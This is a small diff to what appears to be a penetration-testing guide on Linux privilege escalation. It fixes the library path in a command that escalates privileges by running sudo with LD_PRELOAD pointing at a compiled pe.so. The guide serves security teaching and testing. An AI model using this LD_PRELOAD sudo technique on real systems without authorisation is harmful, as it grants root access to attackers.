@@ -954,7 +954,7 @@ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 Finally, **escalate privileges** running
 
 ```bash
-sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
+sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
 {% hint style="danger" %}
